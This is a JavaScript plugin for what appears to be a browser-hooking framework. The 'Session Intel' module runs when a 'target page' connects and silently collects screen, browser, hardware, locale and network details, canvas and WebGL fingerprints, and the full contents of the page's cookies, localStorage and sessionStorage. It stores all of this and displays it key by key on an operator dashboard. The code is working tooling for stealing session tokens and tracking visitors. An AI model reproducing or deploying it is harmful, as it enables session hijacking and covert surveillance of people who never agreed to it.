/**
 * WraithUtils — Session Intelligence Gatherer
 * Collects browser, hardware, network, locale, storage, preference, and fingerprint data.
 */

import { Panel, StatCard } from '@framework/ui'

function Section({ title, children, first }) {
  return (
    <div style={first ? {} : { marginTop: '1.75rem', paddingTop: '1.75rem', borderTop: '1px solid #252535' }}>
      <p className="text-xs font-semibold uppercase tracking-widest text-muted px-0.5 mb-2">{title}</p>
      <div className="rounded border border-border bg-surface divide-y divide-border overflow-hidden">
        {children}
      </div>
    </div>
  )
}

function Row({ label, value }) {
  if (value === null || value === undefined) return null
  const display = Array.isArray(value)
    ? (value.length ? value.join(', ') : '—')
    : String(value)
  if (!display || display === 'null' || display === 'undefined') return null
  return (
    <div className="flex items-start justify-between gap-6 px-3 py-2">
      <span className="text-xs text-muted shrink-0">{label}</span>
      <span className="text-xs text-gray-200 text-right break-all font-mono max-w-xs">{display}</span>
    </div>
  )
}

export default {
  id:          'wraith-utils',
  name:        'Session Intel',
  version:     '1.0.0',
  author:      'tilmana',
  date:        '2026-04-19',
  description: 'One-shot collection of browser, hardware, network, locale, storage, preference, and fingerprint data.',
  permissions: ['system_info'],

  capture: {
    init: [
      {
        key:     'display',
        persist: true,
        collect: () => ({
          screenWidth:       window.screen.width,
          screenHeight:      window.screen.height,
          availWidth:        window.screen.availWidth,
          availHeight:       window.screen.availHeight,
          colorDepth:        window.screen.colorDepth,
          pixelDepth:        window.screen.pixelDepth,
          devicePixelRatio:  window.devicePixelRatio,
          windowWidth:       window.innerWidth,
          windowHeight:      window.innerHeight,
          outerWidth:        window.outerWidth,
          outerHeight:       window.outerHeight,
          orientation:       window.screen.orientation ? window.screen.orientation.type : null,
        }),
      },
      {
        key:     'browser',
        persist: true,
        collect: () => {
          var nav = window.navigator
          return {
            userAgent:     nav.userAgent,
            language:      nav.language,
            languages:     Array.from(nav.languages || []),
            platform:      nav.platform,
            vendor:        nav.vendor,
            cookieEnabled: nav.cookieEnabled,
            doNotTrack:    nav.doNotTrack,
            onLine:        nav.onLine,
            plugins:       Array.from(nav.plugins || []).map(function(p) { return p.name }).filter(Boolean),
          }
        },
      },
      {
        key:     'hardware',
        persist: true,
        collect: () => ({
          hardwareConcurrency: window.navigator.hardwareConcurrency,
          deviceMemory:        window.navigator.deviceMemory,
          maxTouchPoints:      window.navigator.maxTouchPoints,
        }),
      },
      {
        key:     'locale',
        persist: true,
        collect: () => {
          var r = Intl.DateTimeFormat().resolvedOptions()
          return {
            timeZone:  r.timeZone,
            locale:    r.locale,
            calendar:  r.calendar,
            utcOffset: -(new Date().getTimezoneOffset()),
          }
        },
      },
      {
        key:     'network',
        persist: true,
        collect: () => {
          var conn = window.navigator.connection || window.navigator.mozConnection || window.navigator.webkitConnection
          if (!conn) return null
          return {
            type:          conn.type,
            effectiveType: conn.effectiveType,
            downlink:      conn.downlink,
            rtt:           conn.rtt,
            saveData:      conn.saveData,
          }
        },
      },
      {
        key:     'storage',
        persist: true,
        collect: () => {
          var ls = {}
          var ss = {}
          var cookies = ''
          try {
            for (var i = 0; i < localStorage.length; i++) {
              var lk = localStorage.key(i)
              if (lk !== null) { ls[lk] = localStorage.getItem(lk) }
            }
          } catch(e) {}
          try {
            for (var j = 0; j < sessionStorage.length; j++) {
              var sk = sessionStorage.key(j)
              if (sk !== null) { ss[sk] = sessionStorage.getItem(sk) }
            }
          } catch(e) {}
          try { cookies = document.cookie } catch(e) {}
          return {
            localStorage:   ls,
            sessionStorage: ss,
            indexedDB:      typeof window.indexedDB !== 'undefined',
            cookieEnabled:  window.navigator.cookieEnabled,
            cookies:        cookies,
          }
        },
      },
      {
        key:     'preferences',
        persist: true,
        collect: () => {
          function mq(q) { return window.matchMedia ? window.matchMedia(q).matches : null }
          return {
            darkMode:      mq('(prefers-color-scheme: dark)'),
            reducedMotion: mq('(prefers-reduced-motion: reduce)'),
            highContrast:  mq('(prefers-contrast: high)'),
            forcedColors:  mq('(forced-colors: active)'),
          }
        },
      },
      {
        key:     'fingerprint',
        persist: true,
        collect: () => {
          var canvas = null
          try {
            var cvs = document.createElement('canvas')
            cvs.width = 280; cvs.height = 60
            var ctx = cvs.getContext('2d')
            ctx.textBaseline = 'alphabetic'
            ctx.fillStyle = '#f60'
            ctx.fillRect(125, 1, 62, 20)
            ctx.fillStyle = '#069'
            ctx.font = '11pt Arial'
            ctx.fillText('Cwm fjordbank', 2, 15)
            ctx.fillStyle = 'rgba(102,204,0,0.7)'
            ctx.font = '18pt Arial'
            ctx.fillText('glyphs', 4, 45)
            canvas = cvs.toDataURL().slice(-40)
          } catch(e) {}

          var webgl = null
          try {
            var c2 = document.createElement('canvas')
            var gl = c2.getContext('webgl') || c2.getContext('experimental-webgl')
            if (gl) {
              var ext = gl.getExtension('WEBGL_debug_renderer_info')
              webgl = {
                vendor:      ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR),
                renderer:    ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
                version:     gl.getParameter(gl.VERSION),
                glslVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
              }
            }
          } catch(e) {}

          return { canvas, webgl }
        },
      },
    ],
  },

  live: (state = {}) => state,

  ui: {
    nav: { label: 'Utils', icon: 'activity' },

    panel: ({ session }) => (
      <Panel title="Session Intel">
        <StatCard label="URL"       value={session.meta.url} />
        <StatCard label="Connected" value={new Date(session.meta.connectedAt).toLocaleString()} />
        <StatCard label="Referrer"  value={session.meta.referrer || '(none)'} />
      </Panel>
    ),

    view: ({ data, session }) => {
      function get(key) { return data.initData?.find(d => d.key === key)?.value }
      const display = get('display')
      const browser = get('browser')
      const hw      = get('hardware')
      const locale  = get('locale')
      const network = get('network')
      const storage = get('storage')
      const prefs   = get('preferences')
      const fp      = get('fingerprint')

      return (
        <div>
          {/* Quick stats */}
          <div className="flex gap-2 flex-wrap" style={{ marginBottom: '1.75rem' }}>
            {locale?.timeZone  && <StatCard label="Timezone"  value={locale.timeZone} />}
            {browser?.language && <StatCard label="Language"  value={browser.language} />}
            {hw?.hardwareConcurrency != null && <StatCard label="CPU cores" value={hw.hardwareConcurrency} />}
            {display && <StatCard label="Screen" value={`${display.screenWidth}×${display.screenHeight}`} />}
            {hw?.deviceMemory  != null && <StatCard label="RAM"       value={`${hw.deviceMemory} GB`} />}
          </div>

          <Section title="Display" first>
            <Row label="Screen resolution"  value={display && `${display.screenWidth} × ${display.screenHeight}`} />
            <Row label="Available area"     value={display && `${display.availWidth} × ${display.availHeight}`} />
            <Row label="Window (inner)"     value={display && `${display.windowWidth} × ${display.windowHeight}`} />
            <Row label="Window (outer)"     value={display && `${display.outerWidth} × ${display.outerHeight}`} />
            <Row label="Device pixel ratio" value={display?.devicePixelRatio} />
            <Row label="Color depth"        value={display && `${display.colorDepth}-bit`} />
            <Row label="Orientation"        value={display?.orientation} />
          </Section>

          <Section title="Browser">
            <Row label="User agent"      value={session.meta.userAgent} />
            <Row label="Platform"        value={browser?.platform} />
            <Row label="Vendor"          value={browser?.vendor} />
            <Row label="Language"        value={browser?.language} />
            <Row label="Languages"       value={browser?.languages} />
            <Row label="Online"          value={browser?.onLine != null ? String(browser.onLine) : null} />
            <Row label="Cookies enabled" value={browser?.cookieEnabled != null ? String(browser.cookieEnabled) : null} />
            <Row label="Do Not Track"    value={browser?.doNotTrack} />
            {browser?.plugins?.length > 0 && <Row label="Plugins" value={browser.plugins} />}
          </Section>

          <Section title="Hardware">
            <Row label="CPU logical cores" value={hw?.hardwareConcurrency} />
            <Row label="Device memory"     value={hw?.deviceMemory != null ? `${hw.deviceMemory} GB` : null} />
            <Row label="Max touch points"  value={hw?.maxTouchPoints} />
          </Section>

          <Section title="Locale">
            <Row label="Timezone"   value={locale?.timeZone} />
            <Row label="Locale"     value={locale?.locale} />
            <Row label="Calendar"   value={locale?.calendar} />
            <Row label="UTC offset" value={locale?.utcOffset != null ? `UTC${locale.utcOffset >= 0 ? '+' : ''}${locale.utcOffset / 60}h` : null} />
          </Section>

          {network && (
            <Section title="Network">
              <Row label="Connection type" value={network.type} />
              <Row label="Effective type"  value={network.effectiveType} />
              <Row label="Downlink"        value={network.downlink != null ? `${network.downlink} Mbps` : null} />
              <Row label="RTT"             value={network.rtt != null ? `${network.rtt} ms` : null} />
              <Row label="Data saver"      value={network.saveData != null ? String(network.saveData) : null} />
            </Section>
          )}

          <Section title="Storage">
            {!storage ? (
              <Row label="status" value="no data collected — reconnect target page" />
            ) : (
              <>
                <Row label="IndexedDB"   value={storage.indexedDB != null ? (storage.indexedDB ? 'available' : 'unavailable') : null} />
                <Row label="Cookies"     value={storage.cookieEnabled != null ? (storage.cookieEnabled ? 'enabled' : 'disabled') : null} />
                <Row label="Cookie data" value={storage.cookies || null} />
                {(() => {
                  const lsIsObj = storage.localStorage !== null && typeof storage.localStorage === 'object'
                  const ssIsObj = storage.sessionStorage !== null && typeof storage.sessionStorage === 'object'
                  if (!lsIsObj && !ssIsObj) {
                    return <Row label="localStorage / sessionStorage" value="reconnect target page to collect contents" />
                  }
                  const lsKeys = lsIsObj ? Object.keys(storage.localStorage) : []
                  const ssKeys = ssIsObj ? Object.keys(storage.sessionStorage) : []
                  return (
                    <>
                      {lsKeys.length === 0
                        ? <Row label="localStorage" value="(empty)" />
                        : lsKeys.map(k => (
                            <Row key={`ls:${k}`} label={`localStorage[${k}]`} value={storage.localStorage[k]} />
                          ))
                      }
                      {ssKeys.length === 0
                        ? <Row label="sessionStorage" value="(empty)" />
                        : ssKeys.map(k => (
                            <Row key={`ss:${k}`} label={`sessionStorage[${k}]`} value={storage.sessionStorage[k]} />
                          ))
                      }
                    </>
                  )
                })()}
              </>
            )}
          </Section>

          <Section title="Preferences">
            {prefs ? (
              <>
                <Row label="Dark mode"      value={prefs.darkMode      ? 'yes' : 'no'} />
                <Row label="Reduced motion" value={prefs.reducedMotion ? 'yes' : 'no'} />
                <Row label="High contrast"  value={prefs.highContrast  ? 'yes' : 'no'} />
                <Row label="Forced colors"  value={prefs.forcedColors  ? 'yes' : 'no'} />
              </>
            ) : (
              <Row label="status" value="no data collected" />
            )}
          </Section>

          <Section title="Fingerprint">
            <Row label="Canvas hash"    value={fp?.canvas} />
            <Row label="WebGL vendor"   value={fp?.webgl?.vendor} />
            <Row label="WebGL renderer" value={fp?.webgl?.renderer} />
            <Row label="WebGL version"  value={fp?.webgl?.version} />
            <Row label="GLSL version"   value={fp?.webgl?.glslVersion} />
          </Section>

          <Section title="Page">
            <Row label="URL"          value={session.meta.url} />
            <Row label="Referrer"     value={session.meta.referrer || '(none)'} />
            <Row label="Connected at" value={new Date(session.meta.connectedAt).toLocaleString()} />
            <Row label="Last seen"    value={new Date(session.lastSeenAt).toLocaleString()} />
            <Row label="Status"       value={session.status} />
          </Section>
        </div>
      )
    },
  },
}
